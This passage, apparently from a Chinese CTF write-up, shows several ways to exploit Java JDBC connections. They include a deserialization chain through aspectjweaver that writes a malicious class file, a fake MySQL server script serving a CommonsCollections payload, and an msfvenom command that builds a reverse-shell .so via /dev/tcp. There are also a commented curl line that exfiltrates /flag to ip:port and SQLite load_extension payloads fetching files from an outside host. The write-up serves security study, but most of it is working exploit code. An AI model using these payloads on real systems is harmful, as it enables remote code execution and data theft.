class="name">goals</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">execution</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">executions</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">plugin</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">plugins</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">build</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">project</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure></p>
<p>这里一开始想到的是2021年CISCN的ezj4va的打法,用mysql jdbc直接返回序列化数据,aspectjweaver写入恶意classes文件<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SimpleCache$StoreableCachingMap.put()</span><br><span class="line">​SimpleCache$StoreableCachingMap.writeToPath()</span><br><span class="line">​FileOutputStream.write()</span><br></pre></td></tr></table></figure></p>
<p>UserBean类:<br><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.jdbctest.bean;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.Serializable;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* loaded from: UserBean.class */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">UserBean</span> <span class="keyword">implements</span> <span class="title class_">Serializable</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">private</span> String age;</span><br><span class="line">    <span class="keyword">private</span> Object obj;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">UserBean</span><span class="params">(String name, String age)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">        <span class="built_in">this</span>.age = age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">UserBean</span><span class="params">()</span> &#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getAge</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setAge</span><span class="params">(String age)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.age = age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">getObj</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.obj;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setObj</span><span class="params">(Object obj)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.obj = obj;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getName</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setName</span><span class="params">(String name)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">readObject</span><span class="params">(ObjectInputStream ois)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">        ObjectInputStream.<span class="type">GetField</span> <span class="variable">gf</span> <span class="operator">=</span> ois.readFields();</span><br><span class="line">        HashMap&lt;String, <span class="type">byte</span>[]&gt; a = (HashMap) gf.get(<span class="string">&quot;obj&quot;</span>, (Object) <span class="literal">null</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">name</span> <span class="operator">=</span> (String) gf.get(<span class="string">&quot;name&quot;</span>, (Object) <span class="literal">null</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">age</span> <span class="operator">=</span> (String) gf.get(<span class="string">&quot;age&quot;</span>, (Object) <span class="literal">null</span>);</span><br><span class="line">        <span class="keyword">if</span> (a == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="built_in">this</span>.obj = <span class="literal">null</span>;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            a.put(name, Base64.getDecoder().decode(age));</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception var7) &#123;</span><br><span class="line">            var7.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><br>这里反序列化正好可以可控一个put方法,我们目的是写入classpath下,这里为了防止本地编译自动在target/classes下生成class文件冲突新建了另一个项目来写exp<br><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.Serializable;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Evil</span> <span class="keyword">implements</span> <span class="title class_">Serializable</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">readObject</span><span class="params">(java.io.ObjectInputStream s)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="comment">//Runtime.getRuntime().exec(new String[]&#123;&quot;/bin/sh&quot;,&quot;-c&quot;,&quot;curl http://ip:port -F file=@/flag&quot;&#125;);</span></span><br><span class="line">         Runtime.getRuntime().exec(<span class="string">&quot;calc&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.example.jdbctest.bean.UserBean;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationTargetException;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">exp1</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> ClassNotFoundException, InstantiationException, IllegalAccessException, InvocationTargetException, IOException &#123;</span><br><span class="line">        UserBean userBean=<span class="keyword">new</span> <span class="title class_">UserBean</span>();</span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">aspectjConstructor</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;org.aspectj.weaver.tools.cache.SimpleCache$StoreableCachingMap&quot;</span>).getDeclaredConstructors()[<span class="number">0</span>];</span><br><span class="line">        aspectjConstructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">simpleCache</span> <span class="operator">=</span> aspectjConstructor.newInstance(<span class="string">&quot;./target/classes&quot;</span>, <span class="number">12</span>);</span><br><span class="line"></span><br><span class="line">        userBean.setObj(simpleCache);</span><br><span class="line">        userBean.setName(<span class="string">&quot;Evil.class&quot;</span>);</span><br><span class="line">        <span class="type">byte</span>[] content_byte = Files.readAllBytes(<span class="keyword">new</span> <span class="title class_">File</span>(<span class="string">&quot;D:\\JavaProject\\writepayload\\src\\main\\java\\Evil.class&quot;</span>).toPath());</span><br><span class="line">        userBean.setAge(Base64.getEncoder().encodeToString(content_byte));</span><br><span class="line">        <span class="type">FileOutputStream</span> <span class="variable">fileOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;payload&quot;</span>);</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">objectOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(fileOutputStream);</span><br><span class="line">        objectOutputStream.writeObject(userBean);</span><br><span class="line"></span><br><span class="line"><span class="comment">//        ByteArrayInputStream bais = new ByteArrayInputStream(bos.toByteArray());</span></span><br><span class="line"><span class="comment">//        ObjectInputStream objectInputStream=new ObjectInputStream(bais);</span></span><br><span class="line"><span class="comment">//        userBean = (UserBean) objectInputStream.readObject();</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>生成的payload文件和jdbc_exp.py文件放到同一个目录:<br><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">greeting_data=<span class="string">&quot;4a0000000a352e372e31390008000000463b452623342c2d00fff7080200ff811500000000000000000000032851553e5c23502c51366a006d7973716c5f6e61746976655f70617373776f726400&quot;</span></span><br><span class="line">response_ok_data=<span class="string">&quot;0700000200000002000000&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">receive_data</span>(<span class="params">conn</span>):</span><br><span class="line">    data = conn.recv(<span class="number">1024</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[*] Receiveing the package : &#123;&#125;&quot;</span>.<span class="built_in">format</span>(data))</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">str</span>(data).lower()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">send_data</span>(<span class="params">conn,data</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[*] Sending the package : &#123;&#125;&quot;</span>.<span class="built_in">format</span>(data))</span><br><span class="line">    conn.send(binascii.a2b_hex(data))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_payload_content</span>():</span><br><span class="line">    <span class="comment">#file文件的内容使用ysoserial生成的 使用规则：java -jar ysoserial [Gadget] [command] &gt; payload</span></span><br><span class="line">    file= <span class="string">r&#x27;payload&#x27;</span></span><br><span class="line">    <span class="keyword">if</span> os.path.isfile(file):</span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(file, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">            payload_content = <span class="built_in">str</span>(binascii.b2a_hex(f.read()),encoding=<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;open successs&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;open false&quot;</span>)</span><br><span class="line">        <span class="comment">#calc</span></span><br><span class="line">        payload_content=<span class="string">&#x27;aced0005737200116a6176612e7574696c2e48617368536574ba44859596b8b7340300007870770c000000023f40000000000001737200346f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e6b657976616c75652e546965644d6170456e7472798aadd29b39c11fdb0200024c00036b65797400124c6a6176612f6c616e672f4f626a6563743b4c00036d617074000f4c6a6176612f7574696c2f4d61703b7870740003666f6f7372002a6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e6d61702e4c617a794d61706ee594829e7910940300014c0007666163746f727974002c4c6f72672f6170616368652f636f6d6d6f6e732f636f6c6c656374696f6e732f5472616e73666f726d65723b78707372003a6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e66756e63746f72732e436861696e65645472616e73666f726d657230c797ec287a97040200015b000d695472616e73666f726d65727374002d5b4c6f72672f6170616368652f636f6d6d6f6e732f636f6c6c656374696f6e732f5472616e73666f726d65723b78707572002d5b4c6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e5472616e73666f726d65723bbd562af1d83418990200007870000000057372003b6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e66756e63746f72732e436f6e7374616e745472616e73666f726d6572587690114102b1940200014c000969436f6e7374616e7471007e00037870767200116a6176612e6c616e672e52756e74696d65000000000000000000000078707372003a6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e66756e63746f72732e496e766f6b65725472616e73666f726d657287e8ff6b7b7cce380200035b000569417267737400135b4c6a6176612f6c616e672f4f626a6563743b4c000b694d6574686f644e616d657400124c6a6176612f6c616e672f537472696e673b5b000b69506172616d54797065737400125b4c6a6176612f6c616e672f436c6173733b7870757200135b4c6a6176612e6c616e672e4f626a6563743b90ce589f1073296c02000078700000000274000a67657452756e74696d65757200125b4c6a6176612e6c616e672e436c6173733bab16d7aecbcd5a990200007870000000007400096765744d6574686f647571007e001b00000002767200106a6176612e6c616e672e537472696e67a0f0a4387a3bb34202000078707671007e001b7371007e00137571007e001800000002707571007e001800000000740006696e766f6b657571007e001b00000002767200106a6176612e6c616e672e4f626a656374000000000000000000000078707671007e00187371007e0013757200135b4c6a6176612e6c616e672e537472696e673badd256e7e91d7b4702000078700000000174000463616c63740004657865637571007e001b0000000171007e00207371007e000f737200116a6176612e6c616e672e496e746567657212e2a0a4f781873802000149000576616c7565787200106a6176612e6c616e672e4e756d62657286ac951d0b94e08b020000787000000001737200116a6176612e7574696c2e486173684d61700507dac1c31660d103000246000a6c6f6164466163746f724900097468726573686f6c6478703f4000000000000077080000001000000000787878&#x27;</span></span><br><span class="line">    <span class="keyword">return</span> payload_content</span><br><span class="line"></span><br><span class="line"><span class="comment"># 主要逻辑</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">run</span>():</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">        conn, addr = sk.accept()</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Connection come from &#123;&#125;:&#123;&#125;&quot;</span>.<span class="built_in">format</span>(addr[<span class="number">0</span>],addr[<span class="number">1</span>]))</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 1.先发送第一个 问候报文</span></span><br><span class="line">        send_data(conn,greeting_data)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            <span class="comment"># 登录认证过程模拟  1.客户端发送request login报文 2.服务端响应response_ok</span></span><br><span class="line">            receive_data(conn)</span><br><span class="line">            send_data(conn,response_ok_data)</span><br><span class="line"></span><br><span class="line">            <span class="comment">#其他过程</span></span><br><span class="line">            data=receive_data(conn)</span><br><span class="line">            <span class="comment">#查询一些配置信息,其中会发送自己的 版本号</span></span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;session.auto_increment_increment&quot;</span> <span class="keyword">in</span> data:</span><br><span class="line">                _payload=<span class="string">&#x27;01000001132e00000203646566000000186175746f5f696e6372656d656e745f696e6372656d656e74000c3f001500000008a0000000002a00000303646566000000146368617261637465725f7365745f636c69656e74000c21000c000000fd00001f00002e00000403646566000000186368617261637465725f7365745f636f6e6e656374696f6e000c21000c000000fd00001f00002b00000503646566000000156368617261637465725f7365745f726573756c7473000c21000c000000fd00001f00002a00000603646566000000146368617261637465725f7365745f736572766572000c210012000000fd00001f0000260000070364656600000010636f6c6c6174696f6e5f736572766572000c210033000000fd00001f000022000008036465660000000c696e69745f636f6e6e656374000c210000000000fd00001f0000290000090364656600000013696e7465726163746976655f74696d656f7574000c3f001500000008a0000000001d00000a03646566000000076c6963656e7365000c210009000000fd00001f00002c00000b03646566000000166c6f7765725f636173655f7461626c655f6e616d6573000c3f001500000008a0000000002800000c03646566000000126d61785f616c6c6f7765645f7061636b6574000c3f001500000008a0000000002700000d03646566000000116e65745f77726974655f74696d656f7574000c3f001500000008a0000000002600000e036465660000001071756572795f63616368655f73697a65000c3f001500000008a0000000002600000f036465660000001071756572795f63616368655f74797065000c210009000000fd00001f00001e000010036465660000000873716c5f6d6f6465000c21009b010000fd00001f000026000011036465660000001073797374656d5f74696d655f7a6f6e65000c21001b000000fd00001f00001f000012036465660000000974696d655f7a6f6e65000c210012000000fd00001f00002b00001303646566000000157472616e73616374696f6e5f69736f6c6174696f6e000c21002d000000fd00001f000022000014036465660000000c776169745f74696d656f7574000c3f001500000008a000000000020100150131047574663804757466380475746638066c6174696e31116c6174696e315f737765646973685f6369000532383830300347504c013107343139343330340236300731303438353736034f4646894f4e4c595f46554c4c5f47524f55505f42592c5354524943545f5452414e535f5441424c45532c4e4f5f5a45524f5f494e5f444154452c4e4f5f5a45524f5f444154452c4552524f525f464f525f4449564953494f4e5f42595f5a45524f2c4e4f5f4155544f5f4352454154455f555345522c4e4f5f454e47494e455f535542535449545554494f4e0cd6d0b9fab1ead7bccab1bce4062b30383a30300f52455045415441424c452d5245414405323838303007000016fe000002000000&#x27;</span></span><br><span class="line">                send_data(conn,_payload)</span><br><span class="line">                data=receive_data(conn)</span><br><span class="line">            <span class="keyword">elif</span> <span class="string">&quot;show warnings&quot;</span> <span class="keyword">in</span> data:</span><br><span class="line">                _payload = <span class="string">&#x27;01000001031b00000203646566000000054c6576656c000c210015000000fd01001f00001a0000030364656600000004436f6465000c3f000400000003a1000000001d00000403646566000000074d657373616765000c210000060000fd01001f000059000005075761726e696e6704313238374b27404071756572795f63616368655f73697a6527206973206465707265636174656420616e642077696c6c2062652072656d6f76656420696e2061206675747572652072656c656173652e59000006075761726e696e6704313238374b27404071756572795f63616368655f7479706527206973206465707265636174656420616e642077696c6c2062652072656d6f76656420696e2061206675747572652072656c656173652e07000007fe000002000000&#x27;</span></span><br><span class="line">                send_data(conn, _payload)</span><br><span class="line">                data = receive_data(conn)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;set names&quot;</span> <span class="keyword">in</span> data:</span><br><span class="line">                send_data(conn, response_ok_data)</span><br><span class="line">                data = receive_data(conn)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;set character_set_results&quot;</span> <span class="keyword">in</span> data:</span><br><span class="line">                send_data(conn, response_ok_data)</span><br><span class="line">                data = receive_data(conn)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;show session status&quot;</span> <span class="keyword">in</span> data:</span><br><span class="line">                mysql_data = <span class="string">&#x27;0100000102&#x27;</span></span><br><span class="line">                mysql_data += <span class="string">&#x27;1a000002036465660001630163016301630c3f00ffff0000fc9000000000&#x27;</span></span><br><span class="line">                mysql_data += <span class="string">&#x27;1a000003036465660001630163016301630c3f00ffff0000fc9000000000&#x27;</span></span><br><span class="line">                <span class="comment"># 为什么我加了EOF Packet 就无法正常运行呢？？</span></span><br><span class="line">                <span class="comment"># 获取payload</span></span><br><span class="line">                payload_content=get_payload_content()</span><br><span class="line">                <span class="comment"># 计算payload长度</span></span><br><span class="line">                payload_length = <span class="built_in">str</span>(<span class="built_in">hex</span>(<span class="built_in">len</span>(payload_content)//<span class="number">2</span>)).replace(<span class="string">&#x27;0x&#x27;</span>, <span class="string">&#x27;&#x27;</span>).zfill(<span class="number">4</span>)</span><br><span class="line">                payload_length_hex = payload_length[<span class="number">2</span>:<span class="number">4</span>] + payload_length[<span class="number">0</span>:<span class="number">2</span>]</span><br><span class="line">                <span class="comment"># 计算数据包长度</span></span><br><span class="line">                data_len = <span class="built_in">str</span>(<span class="built_in">hex</span>(<span class="built_in">len</span>(payload_content)//<span class="number">2</span> + <span class="number">4</span>)).replace(<span class="string">&#x27;0x&#x27;</span>, <span class="string">&#x27;&#x27;</span>).zfill(<span class="number">6</span>)</span><br><span class="line">                data_len_hex = data_len[<span class="number">4</span>:<span class="number">6</span>] + data_len[<span class="number">2</span>:<span class="number">4</span>] + data_len[<span class="number">0</span>:<span class="number">2</span>]</span><br><span class="line">                mysql_data += data_len_hex + <span class="string">&#x27;04&#x27;</span> + <span class="string">&#x27;fbfc&#x27;</span>+ payload_length_hex</span><br><span class="line">                mysql_data += <span class="built_in">str</span>(payload_content)</span><br><span class="line">                mysql_data += <span class="string">&#x27;07000005fe000022000100&#x27;</span></span><br><span class="line">                send_data(conn, mysql_data)</span><br><span class="line">                data = receive_data(conn)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;show warnings&quot;</span> <span class="keyword">in</span> data:</span><br><span class="line">                payload = <span class="string">&#x27;01000001031b00000203646566000000054c6576656c000c210015000000fd01001f00001a0000030364656600000004436f6465000c3f000400000003a1000000001d00000403646566000000074d657373616765000c210000060000fd01001f00006d000005044e6f74650431313035625175657279202753484f572053455353494f4e20535441545553272072657772697474656e20746f202773656c6563742069642c6f626a2066726f6d2063657368692e6f626a73272062792061207175657279207265777269746520706c7567696e07000006fe000002000000&#x27;</span></span><br><span class="line">                send_data(conn, payload)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    HOST =<span class="string">&#x27;0.0.0.0&#x27;</span></span><br><span class="line">    PORT = <span class="number">3306</span></span><br><span class="line"></span><br><span class="line">    sk = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">    <span class="comment">#当socket关闭后，本地端用于该socket的端口号立刻就可以被重用.为了实验的时候不用等待很长时间</span></span><br><span class="line">    sk.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, <span class="number">1</span>)</span><br><span class="line">    sk.bind((HOST, PORT))</span><br><span class="line">    sk.listen(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;start fake mysql server listening on &#123;&#125;:&#123;&#125;&quot;</span>.<span class="built_in">format</span>(HOST,PORT))</span><br><span class="line"></span><br><span class="line">    run()</span><br></pre></td></tr></table></figure><br>此脚本会先寻找当前目录的payload文件传给mysql,没有就传自定义的默认的数据</p>
<p>第一次我们写入恶意的classes文件<br><img src="https://image-1317255302.cos.ap-shanghai.myqcloud.com/markdown/20240523224631.png" alt="image.png"></p>
<p>第二次我们直接把Evil类序列化通过Mysql JDBC返回,它会先去classpath下寻找是否有同名文件,有的话直接调用其中我们重写的readObject()方法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">exp2</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        FileOutputStream fileOutputStream=<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;payload&quot;</span>);</span><br><span class="line">        ObjectOutputStream objectOutputStream=<span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(fileOutputStream);</span><br><span class="line">        objectOutputStream.writeObject(<span class="keyword">new</span> <span class="title class_">Evil</span>());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><img src="https://image-1317255302.cos.ap-shanghai.myqcloud.com/markdown/20240523224844.png" alt="image.png"><br>成功弹出计算器</p>
<p>但是远程没有打通,因为远程应该是个jar包,没有.target/classes这个目录,之前的题能打通是因为那个题有iml配置文件配置了<code>target/classes</code>为<code>WEB-INF/classes</code></p>
<h2 id="mysql写so文件-sqlite加载so-RCE"><a href="#mysql写so文件-sqlite加载so-RCE" class="headerlink" title="mysql写so文件+sqlite加载so RCE"></a>mysql写so文件+sqlite加载so RCE</h2><p>看了别人的wp发现是打sqlite:</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.xerial<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>sqlite-jdbc<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.8.9<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p><img src="https://image-1317255302.cos.ap-shanghai.myqcloud.com/markdown/20240523234557.png" alt="image.png"><br><img src="https://image-1317255302.cos.ap-shanghai.myqcloud.com/markdown/20240523234610.png" alt="image.png"><br>参考: <a href="https://github.com/Y4tacker/JavaSec/blob/main/9.JDBC%20Attack/SQLite/index.md">https://github.com/Y4tacker/JavaSec/blob/main/9.JDBC%20Attack/SQLite/index.md</a><br>和 <a href="https://research.checkpoint.com/2019/select-code_execution-from-using-sqlite/">https://research.checkpoint.com/2019/select-code_execution-from-using-sqlite/</a><br>我们这里有可控的select语句,将tableName设置成<code>create view xxx as 恶意select语句</code>,我们执行<code>select * from tableName</code>时会被劫持去执行恶意select语句,也可以通过()括上select语句来执行里面的select语句</p>
<p>我们这里可以通过mysql上传一个恶意的so文件到/tmp目录,然后打sqlite去加载恶意so文件</p>
<p>so文件:<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">msfvenom -p linux/x64/exec CMD=&#x27;echo bash -c &quot;bash -i &gt;&amp; /dev/tcp/ip/port 0&gt;&amp;1&quot;的base64编码|base64 -d|bash&#x27; -f elf-so -o evil.so</span><br></pre></td></tr></table></figure></p>
<p>之前mysql jdbc的payload改一下<br><code>Object simpleCache = aspectjConstructor.newInstance(&quot;./target/classes&quot;, 12);</code><br>的<code>./target/classes</code>为<code>../../../../../../../tmp</code>即可</p>
<p>然后打sqlite<br><figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line"><span class="attr">&quot;type&quot;</span><span class="punctuation">:</span><span class="string">&quot;3&quot;</span><span class="punctuation">,</span></span><br><span class="line"><span class="attr">&quot;tableName&quot;</span><span class="punctuation">:</span><span class="string">&quot;(select (load_extension(\&quot;/tmp/evil.so\&quot;)));&quot;</span><span class="punctuation">,</span></span><br><span class="line"> <span class="attr">&quot;url&quot;</span><span class="punctuation">:</span><span class="string">&quot;jdbc:sqlite:file:/tmp/db?enable_load_extension=true&quot;</span></span><br><span class="line"> <span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure></p>
<h2 id="sqlite写文件-加载so文件"><a href="#sqlite写文件-加载so文件" class="headerlink" title="sqlite写文件+加载so文件"></a>sqlite写文件+加载so文件</h2><p>主要参考: <a href="https://www.cnblogs.com/F12-blog/p/18208215">https://www.cnblogs.com/F12-blog/p/18208215</a><br>还可以通过sqlite写文件:</p>
<ol>
<li>先传入恶意so文件的缓存文件(.db),然后传入服务端,<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;type&quot;</span><span class="punctuation">:</span><span class="string">&quot;3&quot;</span><span class="punctuation">,</span><span class="attr">&quot;url&quot;</span><span class="punctuation">:</span><span class="string">&quot;jdbc:sqlite::resource:http://ip:port/poc.so&quot;</span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
此时会在/tmp下生成一个sqlite-jdbc-tmp-??????.db<br>这个????的计算方法是<code>new URL(url).hashCode()+&#39;.db&#39;</code></li>
<li><p>同样方法上传恶意db文件,内容是指定tableName方便后面来劫持select语句去执行我们恶意的select语句<br>db文件内容:</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">VIEW</span> security <span class="keyword">as</span> <span class="keyword">SELECT</span> ( <span class="keyword">SELECT</span> load_extension(<span class="string">&#x27;/tmp/sqlite-jdbc-tmp--??????.db&#x27;</span>));</span><br></pre></td></tr></table></figure>
<p>这个load的是第一步上传的so文件<br>payload:</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;type&quot;</span><span class="punctuation">:</span><span class="string">&quot;3&quot;</span><span class="punctuation">,</span><span class="attr">&quot;url&quot;</span><span class="punctuation">:</span><span class="string">&quot;jdbc:sqlite::resource:http://ip:port/poc.db&quot;</span><span class="punctuation">,</span><span class="attr">&quot;tableName&quot;</span><span class="punctuation">:</span> <span class="string">&quot;security&quot;</span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
<p>此时又在/tmp下生成一个db文件,是poc.db的</p>
</li>
<li><p>开启load_extension,加载恶意so文件</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;type&quot;</span><span class="punctuation">:</span><span class="string">&quot;3&quot;</span><span class="punctuation">,</span><span class="attr">&quot;url&quot;</span><span class="punctuation">:</span><span class="string">&quot;jdbc:sqlite:file:/tmp/sqlite-jdbc-tmp--??????.db?enable_load_extension=true&quot;</span><span class="punctuation">,</span><span class="attr">&quot;tableName&quot;</span><span class="punctuation">:</span> <span class="string">&quot;security&quot;</span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
<p>此时的file是上一步的poc.db的</p>
</li>
</ol>
<p>参考:</p>
<ul>
